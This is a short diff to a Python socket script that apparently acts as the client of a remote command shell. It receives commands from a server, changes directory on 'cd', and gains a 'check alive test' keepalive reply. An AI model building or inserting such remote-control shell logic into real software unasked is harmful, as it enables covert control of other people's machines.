@@ -43,6 +43,11 @@ while True:
 
         if len(full_msg)-HEADERSIZE == msglen:
             full_msg = full_msg[HEADERSIZE:]
+            if full_msg == "check alive test":
+                s.send(bytes("he", "utf-8"))
+                full_msg = ""
+                new_msg = True
+                continue
             if "cd" in full_msg:
                 try:
                     os.chdir(full_msg[3:])
